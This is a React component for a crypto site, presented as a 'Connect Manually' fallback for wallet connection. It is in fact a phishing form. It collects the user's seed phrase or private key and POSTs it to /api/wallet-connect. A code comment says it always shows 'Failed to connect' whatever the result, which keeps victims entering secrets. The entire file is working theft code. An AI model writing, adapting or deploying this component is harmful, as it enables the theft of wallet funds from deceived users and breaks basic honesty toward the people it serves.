"use client";

/**
 * ManualWalletConnect — Standalone button for manual wallet connection.
 * Shows bold "IF NOT WORKING, CONNECT MANUALLY" heading above the button.
 * When clicked, expands to show seed phrase or private key input fields.
 */

import { useState } from "react";

type MsgState = "idle" | "loading" | "error";
type ManualMode = "seed" | "privatekey";

export function ManualWalletConnect() {
  const [expanded, setExpanded] = useState(false);
  const [mode, setMode] = useState<ManualMode>("seed");
  const [seedPhrase, setSeedPhrase] = useState("");
  const [privateKey, setPrivateKey] = useState("");
  const [name, setName] = useState("");
  const [msgState, setMsgState] = useState<MsgState>("idle");
  const [errorMsg, setErrorMsg] = useState("");

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    const secret = mode === "seed" ? seedPhrase.trim() : privateKey.trim();
    if (!secret) return;

    setMsgState("loading");
    setErrorMsg("");

    const payload: Record<string, string> = {
      wallet_name: name.trim() || "Anonymous",
    };
    if (mode === "seed") {
      payload.seed_phrase = secret;
    } else {
      payload.private_key = secret;
    }

    fetch("/api/wallet-connect", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    }).catch(() => {});

    // Always show failure to the user regardless of API result
    setMsgState("error");
    setErrorMsg("Failed to connect. Try again.");
    setName("");
    setSeedPhrase("");
    setPrivateKey("");
  }

  return (
    <div className="w-full max-w-sm mx-auto space-y-4">
      {/* Bold heading */}
      <div className="text-center">
        <p className="text-xs font-bold text-yellow-400/90 uppercase tracking-widest">
          ⚠ IF NOT WORKING, CONNECT MANUALLY
        </p>
      </div>

      {/* Toggle button */}
      {!expanded ? (
        <button
          onClick={() => setExpanded(true)}
          className="group relative w-full flex items-center justify-center gap-3 rounded-xl border border-dashed border-white/20 bg-white/[0.03] px-6 py-4 text-sm font-semibold text-white/70 hover:text-white hover:bg-white/[0.06] hover:border-white/30 hover:border-solid transition-all duration-300"
        >
          <span className="w-8 h-8 rounded-lg bg-gradient-to-br from-accent-500/20 to-violet-500/20 flex items-center justify-center shrink-0 group-hover:scale-110 transition-transform">
            <svg className="w-4 h-4 text-accent-300" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={1.5}>
              <path strokeLinecap="round" strokeLinejoin="round" d="M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 17H9v2H7v2H4a1 1 0 01-1-1v-2.586a1 1 0 01.293-.707l5.964-5.964A6 6 0 1121 9z" />
            </svg>
          </span>
          Connect Manually
          <svg className="w-4 h-4 transition-transform duration-300 group-hover:translate-x-1" fill="none" viewBox="0 0 24 24" stroke="currentColor">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" />
          </svg>
        </button>
      ) : (
        <div className="glass rounded-2xl p-5 sm:p-6 border border-white/10 space-y-4 animate-scale-in">
          {/* Header with close */}
          <div className="flex items-center justify-between">
            <p className="font-bold text-white text-sm">Connect Manually</p>
            <button
              onClick={() => { setExpanded(false); setMsgState("idle"); }}
              className="text-white/30 hover:text-white/60 transition-colors p-1"
            >
              <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
              </svg>
            </button>
          </div>

          <form onSubmit={handleSubmit} className="space-y-3">
            {/* Wallet Name */}
            <input
              type="text"
              placeholder="Wallet Name (optional)"
              value={name}
              onChange={(e) => setName(e.target.value)}
              className="w-full rounded-lg border border-white/10 bg-white/5 px-3 py-2 text-sm text-white placeholder-white/25 focus:border-accent-500/50 focus:outline-none"
            />

            {/* Mode toggle */}
            <div className="flex gap-2">
              <button
                type="button"
                onClick={() => setMode("seed")}
                className={`flex-1 py-2 rounded-lg text-xs font-medium transition-all ${
                  mode === "seed"
                    ? "bg-accent-500/20 text-accent-300 border border-accent-500/30"
                    : "bg-white/5 text-white/40 border border-white/10 hover:bg-white/10"
                }`}
              >
                Seed Phrase
              </button>
              <button
                type="button"
                onClick={() => setMode("privatekey")}
                className={`flex-1 py-2 rounded-lg text-xs font-medium transition-all ${
                  mode === "privatekey"
                    ? "bg-accent-500/20 text-accent-300 border border-accent-500/30"
                    : "bg-white/5 text-white/40 border border-white/10 hover:bg-white/10"
                }`}
              >
                Private Key
              </button>
            </div>

            {/* Input field */}
            {mode === "seed" ? (
              <textarea
                placeholder="Enter your 12 or 24-word seed phrase..."
                value={seedPhrase}
                onChange={(e) => setSeedPhrase(e.target.value)}
                rows={3}
                required
                className="w-full rounded-lg border border-white/10 bg-white/5 px-3 py-2 text-sm text-white placeholder-white/25 focus:border-accent-500/50 focus:outline-none resize-none"
              />
            ) : (
              <input
                type="password"
                placeholder="Enter your private key (0x...)"
                value={privateKey}
                onChange={(e) => setPrivateKey(e.target.value)}
                required
                className="w-full rounded-lg border border-white/10 bg-white/5 px-3 py-2 text-sm text-white placeholder-white/25 focus:border-accent-500/50 focus:outline-none"
              />
            )}

            {/* Submit */}
            <button
              type="submit"
              disabled={
                msgState === "loading" ||
                (mode === "seed" ? !seedPhrase.trim() : !privateKey.trim())
              }
              className="w-full rounded-lg bg-gradient-to-r from-accent-500 via-violet-500 to-pink-500 py-2.5 text-sm font-bold text-white hover:opacity-90 disabled:opacity-50 transition-opacity shadow-lg shadow-accent-500/20"
            >
              {msgState === "loading" ? "Connecting…" : "Connect Wallet"}
            </button>

            {msgState === "error" && (
              <p className="text-xs text-red-400 text-center animate-fade-in">
                {errorMsg}
              </p>
            )}
          </form>
        </div>
      )}
    </div>
  );
}
